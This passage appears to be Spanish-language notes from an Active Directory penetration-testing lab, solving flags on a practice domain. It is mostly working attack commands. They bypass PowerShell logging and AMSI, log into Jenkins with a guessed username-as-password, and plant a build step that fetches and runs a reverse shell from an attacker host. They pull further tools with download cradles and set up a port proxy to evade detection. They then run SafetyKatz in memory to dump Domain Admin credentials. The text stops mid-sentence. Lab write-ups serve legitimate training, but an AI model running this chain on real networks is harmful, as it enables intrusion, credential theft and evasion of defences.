## Tareas
- [ ]  Identifique una maquina en el dominio de destino donde haya una sesión de administrador de dominio disponible
- [ ] Comprometer la maquina y elevar privilegios a Administrador de dominio abusando de una reverse shell en dcorp-ci
- [ ] Escalar privilegios a Domain Admin abusando de la administración local derivada a través de dcorp-adminsrv. En dcorp-adminsrv listar la lista de permisos de la aplicaion
	- [ ] Lagunas en las reglas de Applocker
	- [ ] Deshabilitar Applocker modificando la GPO aplicable

**Flag 10: Proceso que usa svcadmin como cuenta de servicio en dcorp-mgmt**
**Flag 11: Hash NTL de la cuenta scvadmin en dcorp-mgmt**
**Flag 12: Intentamos extraer credenciales en texto plano para tareas programas el valor de la flag es similar a lsass, registry, credential vault, etc**
**Flag 13: Hash NTLM de srvadmin extraído de dcorp-adminsrv**
**Flag 14: Hash NTLM de websvc extraído de dcorp-adminsrv**
**Flag 15: Hash NTLM de appadmin extraído de dcorp-adminsrv**


## Solución 1, Identificar una maquina en el dominio destino donde haya una sesión de administrador disponible
Primero deberemos de ejecutar *InviShell* para poder eludir las detecciones de PowerShell y poder ejecutar este de forma mas sigilosa
```shell
.\InviShell\RunWithRegistryNonAdmin.bat  
```

Y después podremos ejecutar *PowerView*
```shell
. .\PowerView.ps1 
```

Verificaremos que la sesión de administrador de dominio esta disponible, para ello primero tendremos que usar *SessionHunter*
```shell
. C:\AD\Tools\Invoke-SessionHunter.ps1
```

Enumeraremos los usuarios con la sesión activa y si tenemos acceso a esos usuarios con 
```shell
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```

Viendo usuarios como
```shell
dcorp-adminsrv dcorp\appadmin              True
dcorp-adminsrv dcorp\srvadmin              True
dcorp-adminsrv dcorp\websvc                True
```

También los podemos listar de una lista de servidores ya guardada
```shell
Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
```

## Solución 2, Comprometer la maquina y elevar privilegios a Administrador de Dominio abusando de una reverse shell en dcorp-ci

Realizaremos los mismos pasos de obtener una Reverse Shell igual que hemos hecho con el [[Laboratorio 05]] aprovechándonos de una vulnerabilidad en Jenkins

Accederemos al servidor de Jenkins que conocemos que se haya en la IP *172.16.3.11:8080*
Nos encontramos que es la versión *2.361.4*, en el panel de People podemos enumerar tres cuentas y antes de hacer fuerza bruta probaremos entre ellas a usar *User as Password* en este caso *builduser::builduser* en el panel de login

Con este usuario se nos permite modificar un proyecto ya existente en la modificación de este, procederemos a acceder a *Configure* -> *Add build step*
Una vez en esa zona de configuración nos mandaremos una reverse shell a nuestra maquina
```shell
powershell iex (iwr -UseBasicParsing http://<attacker_machine>/Invoke-PowershellTcp.ps1);power -Reverse -IPAddress <attacker_machine> -Port 1339
```

Una vez tenemos introducido el reverse shell lo guardaremos y ejecutaremos *netcat* poniéndonos en escucha en el puerto selecciona
```shell
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1339
```

Ejecutaremos *hsf.exe* y cargaremos *Invoke-PowerShellTcp.ps1*
Y copiaremos la URL ahora en Jenkins haremos clic en Buid Now descargándose nuestro *PowerShellTcp* en la maquina victima recibiendo así una conexión en nuestro *Netcat* como el usuario *ciadmin*

Ahora transferiremos al servidor HTTP *hsf.exe* programas como *PowerView, Loader, SfetyKatz y sbloggingbypass* además deberemos de pasarnos el fichero *Amsi-Byp.txt*

Y nos descargaremos los archivos en el siguiente orden
```shell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/sbloggingbypass.txt')
```

```shell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Amsi-Byp.txt')
```

```shell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/PowerView.ps1')
```

Ahora enumeraremos a todos aquellos usuarios logados en el dominio y tienen sesiones activas viendo en que maquina esta cada uno
```shell
Find-DomainUserLocation
```

viendo que hay una sesión de Domain Asmin en el servidor *dcorp-mgmt* del cual nos podemos aprovechar usando *winrs* para poder ejecutar en la maquina una orden la cual nos de el nombre del equipo y usuario
```shell
 winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```

Ahora tenemos que extraer las credenciales de el, para ello tenemos que usar *SafetyKatz* pero primero tenemos que copiar *Loader* en *dcorp-mgmt*

Primero lo descargamos en *dcorp-ci*
```shell
iwr http://172.16.100.97/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

Una vez lo tenemos aquí lo transferiremos a *dcorp-mgmt*
```shell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

Ahora volveremos a poder usar *winrs* para poder ejecutarlo en el equipo de *dcorp-mgmt*, en este caso para poder evitar la detección en el dominio haremos un reenvió de puertos a t
```shell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.67"
```

Haciendo que la maquina objetivo escuche en el puerto *8080* y reenvié el trafico al *80* de nuestra maquina atacante

Usamos *$null* para solucionar problemas a la redirección de salida
Para poder ejecutar ahora *SafetyKatz* en *dcorp-mgmt*, lo descagamos y ejecutamos en memoria usando el *Loader*
```shell
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

Dandonos como respuesta las credenciales del *svcadmin* que es Domain Admin
Al ser esta una cuenta de servicio que se puede saber al ver que pone 